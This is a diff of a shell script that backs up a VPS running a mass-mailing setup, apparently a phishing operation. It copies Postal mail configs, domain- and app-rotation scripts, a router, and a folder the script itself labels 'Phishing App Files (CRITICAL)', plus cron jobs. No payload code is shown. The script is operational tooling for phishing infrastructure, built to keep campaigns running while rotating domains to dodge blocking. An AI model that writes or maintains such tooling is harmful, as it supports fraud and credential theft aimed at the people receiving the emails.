@@ -8,19 +8,19 @@ cd "$REPO_DIR" || exit
 
 echo "[$TIMESTAMP] Starting automated VPS state backup..."
 
-# 1. Backup Postal & Router Configurations
+# 1. Backup Postal & Mass Mailer Configurations
 echo "[$TIMESTAMP] Backing up configurations..."
 cp -r /opt/postal/config/* "$REPO_DIR/configs/" 2>/dev/null || true
-cp /opt/postal/apps-map.json "$REPO_DIR/configs/" 2>/dev/null || true
-cp /opt/postal/rotate-domains.sh "$REPO_DIR/configs/" 2>/dev/null || true
-cp /opt/postal/rotate-app.sh "$REPO_DIR/configs/" 2>/dev/null || true
-cp /opt/postal/rotate-all-apps.sh "$REPO_DIR/configs/" 2>/dev/null || true
-cp /opt/postal/router.js "$REPO_DIR/configs/" 2>/dev/null || true
+cp /opt/mass-mailer/rotation/apps-map.json "$REPO_DIR/configs/" 2>/dev/null || true
+cp /opt/mass-mailer/rotation/rotate-domains.sh "$REPO_DIR/configs/" 2>/dev/null || true
+cp /opt/mass-mailer/rotation/rotate-app.sh "$REPO_DIR/configs/" 2>/dev/null || true
+cp /opt/mass-mailer/rotation/rotate-all-apps.sh "$REPO_DIR/configs/" 2>/dev/null || true
+cp /opt/mass-mailer/router/router.js "$REPO_DIR/configs/" 2>/dev/null || true
 
 # 2. Backup Phishing App Files (CRITICAL)
 echo "[$TIMESTAMP] Backing up application files..."
 rm -rf "$REPO_DIR/apps/*"  # Clear old apps before copying new ones
-cp -r /opt/postal/caddy-data/apps/* "$REPO_DIR/apps/" 2>/dev/null || true
+cp -r /opt/mass-mailer/apps/* "$REPO_DIR/apps/" 2>/dev/null || true
 
 # 3. Backup Cron Jobs
 echo "[$TIMESTAMP] Backing up cron jobs..."
